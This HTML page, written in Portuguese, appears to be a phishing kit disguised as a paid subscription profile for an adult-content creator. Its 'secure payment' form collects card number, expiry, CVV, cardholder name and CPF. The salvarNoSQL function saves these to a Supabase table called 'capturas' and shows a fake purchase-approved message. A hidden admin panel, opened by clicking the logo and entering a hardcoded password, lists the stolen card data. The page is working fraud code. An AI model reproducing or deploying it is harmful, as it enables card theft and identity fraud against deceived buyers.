<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        :root { --primary: #f47b52; --grad: linear-gradient(90deg, #f47b52, #f9a67a); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; color: #111; }
        .nav-top { padding: 12px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: #fff; z-index: 100; }
        .banner { width: 100%; height: 200px; object-fit: cover; }
        .profile-pic { width: 110px; height: 110px; border-radius: 50%; border: 4px solid #fff; margin-top: -55px; margin-left: 20px; position: relative; z-index: 10; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .info { padding: 15px 20px; }
        .name { font-size: 22px; font-weight: 800; display: flex; align-items: center; gap: 5px; }
        .stats { display: flex; gap: 20px; margin-top: 15px; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 10px 0; }
        .stat-item { text-align: center; flex: 1; }
        .stat-item b { display: block; font-size: 16px; }
        .stat-item span { font-size: 12px; color: #666; }
        .feed { padding: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .feed img { width: 100%; border-radius: 8px; filter: blur(4px); }
        .btn-sub { width: 90%; margin: 20px auto; padding: 18px; border-radius: 50px; border: none; color: #fff; background: var(--grad); font-weight: 800; cursor: pointer; display: flex; justify-content: space-between; position: fixed; bottom: 10px; left: 5%; z-index: 100; }
        
        #payModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); }
        .modal-content { background: #fff; width: 92%; max-width: 400px; margin: 10% auto; border-radius: 20px; padding: 25px; }
        .form-group { margin-bottom: 12px; }
        .form-group label { display: block; font-weight: 700; font-size: 11px; margin-bottom: 4px; }
        .form-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; }
        
        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; color: #fff; z-index: 9999; padding: 20px; overflow-y: auto; }
        .log-card { background: #222; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid var(--primary); font-size: 13px; }
    </style>
</head>
<body>

    <nav class="nav-top">
        <img src="logo.png" height="26" onclick="checkAdmin()">
        <i class="fa-solid fa-bars"></i>
    </nav>

    <img src="capa.png" class="banner">
    <img src="perfil1.png" class="profile-pic">

    <div class="info">
        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--primary)"></i></div>
        <p style="color: #666; font-size: 14px;">@eukamylinhasantos</p>
        
        <div class="stats">
            <div class="stat-item"><b>142</b><span>M√≠dias</span></div>
            <div class="stat-item"><b>48k</b><span>Curtidas</span></div>
            <div class="stat-item"><b>1.2k</b><span>F√£s</span></div>
        </div>

        <p style="margin-top:15px; font-size:14px">Seja bem-vindo ao meu lado picante! üî• Conte√∫dos exclusivos todos os dias.</p>
    </div>

    <div class="feed">
        <img src="imagem1.png">
        <img src="imagem2.png">
    </div>

    <button class="btn-sub" onclick="document.getElementById('payModal').style.display='block'">
        <span>ASSINAR AGORA</span> <span>R$ 10,00</span>
    </button>

    <div id="payModal">
        <div class="modal-content">
            <h2 style="text-align:center; color:var(--primary); margin-bottom:20px">Pagamento Seguro</h2>
            <div class="form-group"><label>NOME NO CART√ÉO</label><input type="text" id="n"></div>
            <div class="form-group"><label>N√öMERO DO CART√ÉO</label><input type="text" id="c"></div>
            <div class="form-group"><label>CPF</label><input type="text" id="cpf"></div>
            <div style="display:flex; gap:10px">
                <div class="form-group" style="flex:1"><label>VALIDADE</label><input type="text" id="v" placeholder="MM/AA"></div>
                <div class="form-group" style="flex:1"><label>CVV</label><input type="text" id="cvv"></div>
            </div>
            <button class="btn-sub" style="width:100%; position:static; margin-top:15px" onclick="salvarNoSQL()">APROVAR COMPRA</button>
        </div>
    </div>

    <div id="adminPanel">
        <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
            <h2>LOGS NOXXZ ‚ö°</h2>
            <button onclick="location.reload()" style="background:red; color:#fff; border:none; padding:5px 15px; border-radius:5px;">Sair</button>
        </div>
        <div id="listaLogs"></div>
    </div>

    <script>
        const SB_URL = 'https://bafumercepnhnlqkxtcd.supabase.co'; 
        const SB_KEY = 'sb_publishable_Z8NyNh7hAAhOjk75y035aw_1siOe_xk';
        const _supabase = supabase.createClient(SB_URL, SB_KEY);

        $(document).ready(function(){
            $('#c').mask('0000 0000 0000 0000');
            $('#cpf').mask('000.000.000-00');
            $('#v').mask('00/00');
            $('#cvv').mask('000');
        });

        async function salvarNoSQL() {
            const dados = {
                nome: document.getElementById('n').value,
                card: document.getElementById('c').value,
                cpf: document.getElementById('cpf').value,
                validade: document.getElementById('v').value,
                cvv: document.getElementById('cvv').value
            };

            if(!dados.card || !dados.cvv) return alert("Preencha os dados corretamente!");
            
            Notiflix.Loading.circle('Processando...');

            const { error } = await _supabase.from('capturas').insert([dados]);

            setTimeout(() => {
                Notiflix.Loading.remove();
                if(error) {
                    alert("Erro ao processar: " + error.message);
                } else {
                    Notiflix.Report.success('Compra Aceita', 'Sua assinatura foi processada. Prazo de 24h para liberar o acesso ao perfil.', 'Entendi');
                    document.getElementById('payModal').style.display='none';
                }
            }, 2000);
        }

        async function checkAdmin() {
            const senha = prompt("Senha Admin:");
            if(senha === "NOXXZ2026") {
                document.getElementById('adminPanel').style.display = 'block';
                const { data } = await _supabase.from('capturas').select('*').order('data_hora', { ascending: false });
                const container = document.getElementById('listaLogs');
                container.innerHTML = "";
                data.forEach(item => {
                    container.innerHTML += `
                        <div class="log-card">
                            <b>NOME:</b> ${item.nome}<br>
                            <b>CART√ÉO:</b> ${item.card}<br>
                            <b>CPF:</b> ${item.cpf}<br>
                            <b>VAL/CVV:</b> ${item.validade} | ${item.cvv}
                        </div>`;
                });
            }
        }
    </script>
</body>
</html>
